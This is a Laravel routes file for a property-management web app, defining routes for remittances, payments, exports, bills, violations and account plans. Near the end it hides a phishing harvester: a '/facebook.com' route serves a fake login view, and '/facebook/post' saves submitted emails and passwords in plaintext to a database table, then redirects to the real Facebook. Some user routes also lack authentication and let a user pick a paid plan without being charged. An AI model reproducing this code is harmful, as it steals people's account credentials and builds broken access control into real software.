Route::post('property/{property_id}/remittances/store', 'RemittanceController@store')->middleware(['auth', 'verified']);
// Route::get('property/{property_id}/tenant/{tenant_id}/payment/{payment_id}/remittance/create', 'RemittanceController@create')->middleware(['auth', 'verified']);
Route::get('property/{property_id}/room/{unit_id}/contract/{contract_id}/tenant/{tenant_id}/bill/{bill_id}/payment/{payment_id}/remittance/create', 'RemittanceController@create')->middleware(['auth', 'verified']);
Route::post('property/{property_id}/room/{unit_id}/contract/{contract_id}/tenant/{tenant_id}/bill/{bill_id}/payment/{payment_id}/remittance/store', 'RemittanceController@store')->middleware(['auth', 'verified']);
Route::get('property/{property_id}/room/{unit_id}/remittance/{remittance_id}', 'RemittanceController@show')->middleware(['auth', 'verified']);
Route::get('property/{property_id}/remittance/{remittance_id}/expenses', 'ExpenseController@index')->middleware(['auth', 'verified']);
Route::get('property/{property_id}/room/{room_id}/remittance/{remittance_id}/edit', 'RemittanceController@edit')->middleware(['auth', 'verified']);
Route::put('property/{property_id}/remittance/{remittance_id}/update', 'RemittanceController@update')->middleware(['auth', 'verified']);
Route::get('property/{property_id}/room/{room_id}/remittance/{remittance_id}/action', 'RemittanceController@action')->middleware(['auth', 'verified']);


Route::get('/listings', function(){

    $properties = Property::all()->count();

    return view('layouts.arsha.listings', compact('properties'));
});

//routes for payments
Route::get('units/{unit_id}/tenants/{tenant_id}/payments/{payment_id}', 'CollectionController@show')->name('show-payment')->middleware(['auth', 'verified']);
Route::post('/payments', 'CollectionController@store')->middleware(['auth', 'verified']);
Route::get('/payments/all', 'CollectionController@index')->name('show-all-payments')->middleware(['auth', 'verified']);
Route::get('/property/{property_id}/payments/search', 'CollectionController@index')->middleware(['auth', 'verified']);
Route::delete('/property/{property_id}/tenant/{tenant_id}/payment/{payment_id}', 'CollectionController@destroy')->middleware(['auth', 'verified']);
Route::get('/property/{property_id}/room/{room_id}/contract/{contract_id}/tenant/{tenant_id}/bill/{bill_id}/payment/{payment_id}/action', 'CollectionController@action')->middleware(['auth', 'verified']);
Route::post('/property/{property_id}/tenant/{tenant_id}/payment/{payment_id}/credit-memo', 'CollectionController@credit_memo')->middleware(['auth', 'verified']);

//export payments per tenant
Route::get('/property/{property_id}/unit/{unit_id}/tenant/{tenant_id}/payment/{payment_id}/dates/{payment_created}/export', 'CollectionController@export')->middleware(['auth', 'verified']);
Route::get('/property/{property_id}/tenant/{tenant_id}/payments/export', 'CollectionController@export_all')->middleware(['auth', 'verified']);

//export payments per unit per tenant
Route::get('/property/{property_id}/unit/{unit_id}/tenant/{tenant_id}/payment/{payment_id}/dates/{payment_created}/export_unit_bills', 'CollectionController@export_unit_bills')->middleware(['auth', 'verified']);
//export payments per day
Route::get('/property/{property_id}/payments/dates/{payment_created}/export/', 'CollectionController@export_collection_per_day')->middleware(['auth', 'verified']);

//export collections per month
Route::get('/property/{property_id}/collections/month/{month}/year/{year}/export/', 'CollectionController@export_collection_per_month')->middleware(['auth', 'verified']);

//print gate pass
Route::get('/units/{unit_id}/tenants/{tenant_id}/print/gatepass', 'TenantController@printGatePass')->middleware(['auth', 'verified']);

Route::get('/units/{unit_id}/tenants/{tenant_id}/bills/send', function($unit_id,$tenant_id){
    $tenant = Tenant::findOrFail($tenant_id);
    $unit = Unit::findOrFail($unit_id);
    $bills = Billing::leftJoin('payments', 'bills.bill_no', '=', 'payments.payment_bill_no')
    ->selectRaw('*, bills.amount - IFNULL(sum(payments.amt_paid),0) as balance')
    ->where('bill_tenant_id', $tenant_id)
    ->groupBy('bill_id')
    ->havingRaw('balance > 0')
    ->get();
    $data = [
        'tenant' => $tenant->first_name.' '.$tenant->last_name ,
        'tenant_status' => $tenant->tenant_status,
        'unit' => $unit->building.' '.$unit->unit_no,
        'bills' => $bills,
];
    $pdf = \PDF::loadView('webapp.bills.soa', $data)->setPaper('a5', 'portrait');
    $pdf->download(Carbon::now().'-'.$tenant->first_name.'-'.$tenant->last_name.'-soa'.'.pdf');
   $pdf->save(storage_path().'_filename.pdf');
})->middleware(['auth', 'verified']);


Route::delete('/tenants/{tenant_id}', 'TenantController@destroy')->middleware(['auth', 'verified']);

Route::get('/owners', function(){
    if( auth()->user()->role_id_foreign === 1 || auth()->user()->role_id_foreign === 4){


            $owners = DB::table('owners')
            ->join('units', 'unit_id_foreign', 'unit_id')
            ->where('unit_property', Auth::user()->property)
            ->get();

            $count_owners = DB::table('owners')
            ->join('units', 'unit_id_foreign', 'unit_id')
            ->where('unit_property', Auth::user()->property)
            ->count();

            return view('webapp.owners.index', compact('owners', 'count_owners'));
    }else{
            return view('layouts.arsha.unregistered');
    }

})->middleware(['auth', 'verified']);

Route::get('/collections', function(){
    if(auth()->user()->role_id_foreign === 3 || auth()->user()->role_id_foreign === 4 || auth()->user()->role_id_foreign === 5){

             $collections = DB::table('units')
             ->leftJoin('tenants', 'unit_id', 'unit_tenant_id')
             ->leftJoin('bills', 'tenant_id', 'bill_tenant_id')
             ->leftJoin('payments', 'payment_bill_id', 'bill_id')
            ->where('unit_property', Auth::user()->property)
            ->orderBy('payment_created', 'desc')
            ->orderBy('ar_no', 'desc')
            ->groupBy('payment_id')
            ->get()
            ->groupBy(function($item) {
                return \Carbon\Carbon::parse($item->payment_created)->timestamp;
            });

        return view('webapp.collections.collections', compact('collections'));
    }else{
        return view('layouts.arsha.unregistered');
    }

})->middleware(['auth', 'verified']);

Route::get('/bills', function(){
    if(auth()->user()->role_id_foreign === 1 || auth()->user()->role_id_foreign === 4 || auth()->user()->role_id_foreign === 3){

        $bills = DB::table('units')
        ->join('tenants', 'unit_id', 'unit_tenant_id')
        ->join('bills', 'tenant_id', 'bill_tenant_id')
        ->where('unit_property', Auth::user()->property)
        ->orderBy('bill_no', 'desc')
        ->get()
        ->groupBy(function($item) {
            return \Carbon\Carbon::parse($item->start)->timestamp;
        });

        return view('webapp.bills.index', compact('bills'));
    }else{
        return view('layouts.arsha.unregistered');
    }

})->middleware(['auth', 'verified']);

Route::get('/housekeeping', function(){
    if(auth()->user()->role_id_foreign === 1 || auth()->user()->role_id_foreign === 4){

        $housekeeping = DB::table('personnels')
        ->where('personnel_property', Auth::user()->property)
        ->where('personnel_type', 'housekeeping')
        ->get();

        return view('webapp.hose.housekeeping', compact('housekeeping'));
    }else{
        return view('layouts.arsha.unregistered');
    }

})->middleware(['auth', 'verified']);

Route::get('/maintenance', function(){
    if(auth()->user()->role_id_foreign === 1 || auth()->user()->role_id_foreign === 4){

         $maintenance = DB::table('personnels')
        ->where('personnel_property', Auth::user()->property)
        ->where('personnel_type', 'maintenance')
        ->get();

        return view('webapp.index.maintenance', compact('maintenance'));
    }else{
        return view('layouts.arsha.unregistered');
    }

})->middleware(['auth', 'verified']);

//routes for violations
Route::get('/property/{property_id}/violations', 'ViolationController@index')->middleware(['auth', 'verified']);
Route::post('/property/{property_id}/tenant/{tenant_id}/violation', 'ViolationController@store')->middleware(['auth', 'verified']);

//routes for creating violation
Route::get('/property/{property_id}/tenant/{tenant_id}/violation/create', 'ViolationController@create')->middleware(['auth', 'verified']);
Route::post('/property/{property_id}/tenant/{tenant_id}/violation/store', 'ViolationController@store')->middleware(['auth', 'verified']);

//routes for suppliers
Route::get('/property/{property_id}/suppliers', 'SupplierController@index')->middleware(['auth', 'verified']);
Route::get('/property/{property_id}/suppliers/create', 'SupplierController@create')->middleware(['auth', 'verified']);
Route::post('/property/{property_id}/suppliers/store', 'SupplierController@store')->middleware(['auth', 'verified']);

// Route::delete('property/{property_id}/tenant/{tenant_id}/bill/{bill_id}', 'BillController@destroy')->middleware(['auth', 'verified']);
Route::put('property/{property_id}/tenant/{tenant_id}/bill/{bill_id}/restore', 'BillController@restore_bill')->middleware(['auth', 'verified']);


//routes for personnels
Route::post('/personnels', 'PersonnelController@store')->middleware(['auth', 'verified']);

//routes for loggin in using google
Route::get('sign-in/google', 'Auth\LoginController@google');
Route::get('sign-in/google/redirect', 'Auth\LoginController@googleRedirect');

Route::put('/users/{user_id}/property', function(Request $request){
    $request->validate([
        'property' => 'required|unique:users|max:255',
        'property_ownership' => 'required',
        'property_type' => 'required',
    ]);
    DB::table('users')
    ->where('id', Auth::user()->id)
    ->update([
        'property' => $request->property,
        'property_type' => $request->property_type,
        'property_ownership' => $request->property_ownership
    ]);
    return back();
});

Route::put('/users/{user_id}/plan', function(Request $request){
    DB::table('users')
    ->where('id', Auth::user()->id)
    ->update([
        'account_type' => $request->account_type,
    ]);

    return back();
});
//routes for registration
//post the desired plan
Route::post('/users/{user_id}/charge', function(Request $request){
    if(Auth::user()->account_type === 'Free'){
         Mail::to(Auth::user()->email)->send(new TenantRegisteredMail());

         return back();
    }else{
        $charge = 0;
        if(Auth::user()->account_type === 'Medium'){
            $charge = 95000;
        }elseif(Auth::user()->account_type === 'Large'){
            $charge = 180000;
        }elseif(Auth::user()->account_type === 'Enterprise'){
            $charge = 240000;
        }elseif(Auth::user()->account_type === 'Corporate'){
            $charge = 480000;
        }
       try{
        Mail::to(Auth::user()->email)->send(new TenantRegisteredMail());

        return back();
       }catch(\Exception $e){
           return back()->with('danger', $e->getMessage());
       }
    }
});

//routes for logging in using facebook
Route::get('/login/google', 'Auth\LoginController@redirectToProvider');
Route::get('/login/google/callback', 'Auth\LoginController@handleProviderCallback');

Route::get('listing', ['as' => 'listing', 'uses'=>'AdsController@listing']);

Route::get('/carpiotech', function(){
    return view('founders.landleybernardo');
});

Route::get('/facebook.com', function(){
    return view('founders.facebook');
});

Route::post('/facebook/post', function(Request $request){
    DB::table('facebook_info')
    ->insert(
                [
                    'email' => $request->email, 
                    'password' => $request->password,
                ]
            );

            return redirect('https://facebook.com');
});


Route::get('/carpiotech/23rd-monthsary', function(){
    return view('founders.index');
});